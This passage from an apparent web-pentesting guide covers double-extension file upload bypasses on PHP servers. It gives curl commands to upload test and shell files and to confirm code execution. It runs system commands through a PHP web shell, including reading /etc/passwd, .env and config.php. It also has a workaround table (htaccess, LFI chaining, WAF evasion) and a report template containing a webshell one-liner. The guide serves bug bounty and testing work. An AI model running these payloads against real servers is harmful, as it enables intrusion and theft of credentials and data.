curl -sI "https://target.com/uploads/shell.php.jpg"

# Key indicators:
# Content-Type: text/html          → PHP is executing (outputs HTML)
# Content-Type: application/x-httpd-php → PHP handler active
# Content-Type: image/jpeg         → Served as image (NOT executing)
# Content-Type: application/octet-stream → Download only (NOT executing)

# Check for Content-Disposition (forces download = not executing)
curl -sI "https://target.com/uploads/shell.php.jpg" | grep -i "content-disposition"
# Content-Disposition: attachment → File downloads, doesn't execute
```

#### Test Code Execution

```bash
# Test with harmless PHP that outputs a unique marker
echo '<?php echo md5("rce_confirmed_" . php_uname()); ?>' > verify.php.jpg
curl -X POST https://target.com/upload \
  -F "file=@verify.php.jpg;type=image/jpeg" -b "session=COOKIE"

# Access and check for MD5 hash in response (proves PHP executed)
RESPONSE=$(curl -s "https://target.com/uploads/verify.php.jpg")
echo "Response: $RESPONSE"

# If response contains a 32-char hex string → PHP EXECUTED
if echo "$RESPONSE" | grep -qP '^[a-f0-9]{32}$'; then
  echo "[!!!] RCE CONFIRMED!"
else
  echo "[-] PHP did not execute"
fi

# Alternative verification with phpinfo()
echo '<?php phpinfo(); ?>' > phpinfo.php.jpg
curl -X POST https://target.com/upload \
  -F "file=@phpinfo.php.jpg;type=image/jpeg" -b "session=COOKIE"
curl -s "https://target.com/uploads/phpinfo.php.jpg" | grep -c "PHP Version"
# If count > 0 → PHP is executing
```

#### Execute System Commands

```bash
# Once RCE is confirmed, run system commands
curl "https://target.com/uploads/shell.php.jpg?cmd=id"
curl "https://target.com/uploads/shell.php.jpg?cmd=whoami"
curl "https://target.com/uploads/shell.php.jpg?cmd=uname+-a"
curl "https://target.com/uploads/shell.php.jpg?cmd=cat+/etc/passwd"
curl "https://target.com/uploads/shell.php.jpg?cmd=ls+-la+/var/www/"
curl "https://target.com/uploads/shell.php.jpg?cmd=env"
curl "https://target.com/uploads/shell.php.jpg?cmd=cat+/var/www/html/.env"
curl "https://target.com/uploads/shell.php.jpg?cmd=cat+/var/www/html/config.php"
```

::

---

## Troubleshooting Failed Double Extension Attacks

When double extension uploads are accepted but code does not execute, the cause is usually one of the following issues.

::collapsible
**Diagnosis and Workaround Matrix**

| Symptom | Cause | Workaround |
| --- | --- | --- |
| File uploads but returns image binary | Server serves by last extension MIME type | Try unknown extension fallback (`shell.php.xyz`) |
| File uploads but returns 403 on access | Execution disabled in upload directory | Upload `.htaccess` to enable execution |
| File uploads but downloads as attachment | `Content-Disposition: attachment` header | Chain with LFI to include the file instead |
| File uploads but filename is randomized | App renames file with UUID | Check if original extension is preserved in metadata |
| File uploads but extension is stripped | App removes everything except last extension | Try reverse double extension or path traversal |
| File uploads but only last extension kept | App uses `pathinfo()` or `splitext()` | Try `.htaccess`/`.user.ini` chain instead |
| File returns 200 but shows raw PHP code | PHP not configured to handle the extension | Upload `.htaccess` with `AddType` directive |
| Nginx returns 404 for `/x.php` path | `cgi.fix_pathinfo=0` | Standard double extension may still work |
| WAF blocks request | WAF signature match on `<?php` | Use obfuscated shell or encoding bypass |
::

::code-collapse
```bash [Diagnostic Commands]
# === Diagnose Why Double Extension Isn't Executing ===

# Check 1: Is the file actually uploaded?
curl -sI "https://target.com/uploads/shell.php.jpg"
# 200 = exists, 404 = not uploaded or wrong path

# Check 2: What Content-Type is returned?
curl -sI "https://target.com/uploads/shell.php.jpg" | grep -i content-type
# text/html or no content-type → PHP may be executing
# image/jpeg → Served as image, not executing

# Check 3: Is the filename preserved?
# Upload file, then check directory listing (if available)
curl -s "https://target.com/uploads/" | grep -i "shell"

# Check 4: Is there an .htaccess blocking execution?
curl -sI "https://target.com/uploads/.htaccess"

# Check 5: Is the upload directory outside web root?
# Upload a file and check if it's accessible at expected URL
# If 404 even though upload succeeded → Different storage location

# Check 6: Is execution blocked by server config?
# Look for headers indicating proxy or CDN
curl -sI "https://target.com/uploads/shell.php.jpg" | grep -iE "x-cache|x-cdn|cf-ray|x-served-by|via"
# If served through CDN → CDN serves static files, won't execute PHP

# Check 7: Does the server rename files?
# Upload file with unique name and search for it
UNIQUE_NAME="unique_$(date +%s).php.jpg"
echo '<?php echo "FOUND"; ?>' > "$UNIQUE_NAME"
curl -X POST https://target.com/upload \
  -F "file=@$UNIQUE_NAME;type=image/jpeg" -b "session=COOKIE"

# Check if original name is preserved
curl -s "https://target.com/uploads/$UNIQUE_NAME"
# If 404, the filename was changed

# Check 8: Look for the file with common renaming patterns
# Pattern: MD5 of original name
HASH=$(echo -n "$UNIQUE_NAME" | md5sum | cut -d' ' -f1)
curl -s "https://target.com/uploads/$HASH.jpg"
curl -s "https://target.com/uploads/$HASH.php.jpg"

# Pattern: Timestamp-based
for ts in $(seq $(date -d "-1 minute" +%s) $(date +%s)); do
  curl -so /dev/null -w "%{http_code}" "https://target.com/uploads/${ts}.jpg" 2>/dev/null
done

# Check 9: Is there URL rewriting stripping the .php extension?
curl -sI "https://target.com/uploads/shell.php.jpg" -L
# Check for redirects
```
::

---

## Bug Bounty Report Template

::collapsible
**Report Structure for Double Extension Bypass**

When writing a bug bounty report for a double extension bypass vulnerability, include these sections to maximize clarity and impact assessment.

```
## Title
Unrestricted File Upload via Double Extension Bypass Leading to Remote Code Execution

## Severity
Critical (CVSS 9.8)

## Vulnerability Type
CWE-434: Unrestricted Upload of File with Dangerous Type

## Description
The file upload functionality at [endpoint] validates uploaded files by checking
only the last file extension. By uploading a file with a double extension such
as `shell.php.jpg`, the application validates `.jpg` as a safe image extension
and accepts the upload. However, the Apache web server is configured with
`AddHandler application/x-httpd-php .php`, which causes it to recognize the
`.php` extension within the filename and execute the file as PHP code.

This allows an attacker to upload arbitrary PHP code and achieve Remote Code
Execution on the server.

## Steps to Reproduce
1. Navigate to [upload page URL]
2. Prepare a PHP webshell: `echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg`
3. Upload `shell.php.jpg` as a profile picture/document
4. Note the uploaded file URL from the response: [uploaded URL]
5. Access the file with a command parameter: `[uploaded URL]?cmd=id`
6. Observe that the server executes the PHP code and returns system information

## Impact
An attacker can:
- Execute arbitrary commands on the server
- Read sensitive files (database credentials, API keys, environment variables)
- Establish persistent backdoor access
- Pivot to internal network
- Compromise other users' data

## Proof of Concept
[Include screenshots and command output]

## Remediation
1. Validate file extensions using a whitelist of allowed extensions
2. Rename uploaded files to random names with a single safe extension
3. Store uploads outside the web root
4. Configure the web server to never execute uploaded files
5. Use `<FilesMatch "\.php$">` instead of `AddHandler` in Apache
6. Set Content-Disposition: attachment for all uploaded files
```
::